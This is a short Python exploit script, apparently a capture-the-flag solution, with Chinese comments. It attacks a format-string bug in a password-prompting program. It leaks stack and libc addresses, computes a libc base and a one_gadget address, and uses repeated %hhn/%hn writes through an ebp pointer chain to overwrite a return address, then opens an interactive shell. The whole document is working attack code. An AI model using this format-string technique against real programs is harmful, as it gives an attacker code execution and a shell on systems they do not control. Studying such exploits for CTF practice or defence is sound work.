from parse_args_and_some_func import *

sh:tube = all_parsed_args['io']

payload = "%6$p,%15$p"
sh.sendlineafter("Please input your name: \n", 'aaaa')
sh.sendlineafter("Please input your password: \n", payload)

sh.recvuntil("This is the wrong password: ")

msg = sh.recvline()
stack_addr, libc_addr = msg.split(b',')

stack_addr = int16(stack_addr.decode())
libc_addr = int16(libc_addr.decode())

stack_ret_addr = stack_addr + 0x24
libc_base_addr = libc_addr - 0x18e81# 0x18f21
LOG_ADDR('libc_base_addr', libc_base_addr)

# 需要修改这个值
gadget =  [0x3cbea, 0x3cbec, 0x3cbf0, 0x3cbf7, 0x6729f, 0x672a0, 0x13573e, 0x13573f] # 0x3d1c0
one_gadget = libc_base_addr + gadget[3]
LOG_ADDR("one_gadget", one_gadget)
STOP()
sh.recvuntil("Try again!\n")

# 先修改ebp指针指向
payload = "%{}c%6$hhn".format(stack_ret_addr & 0xff) + 0x10 * 'a'
sh.sendline(payload)
sh.recvuntil("Try again!\n")

# 修改低字节的one_gadget
payload = "%{}c%10$hn".format(one_gadget & 0xffff) + 0x10 * 'a'
sh.sendline(payload)
sh.recvuntil("Try again!\n")

# 再修改ebp指针指向
payload = "%{}c%6$hhn".format((stack_ret_addr & 0xff) + 2) + 0x10 * 'a'
sh.sendline(payload)
sh.recvuntil("Try again!\n")

# 再修改高字节的one_gadget
payload = "%{}c%10$hhn".format((one_gadget >> 16) & 0xff) + 0x10 * 'a'
sh.sendline(payload)
sh.recvuntil("Try again!\n")

# 再恢复ebp
payload = "%{}c%6$hhn".format((stack_ret_addr & 0xff) - 0x14) + 0x10 * 'a'
sh.sendline(payload)
sh.recvuntil("Try again!\n")

sh.send("wllmmllw")

sh.interactive()
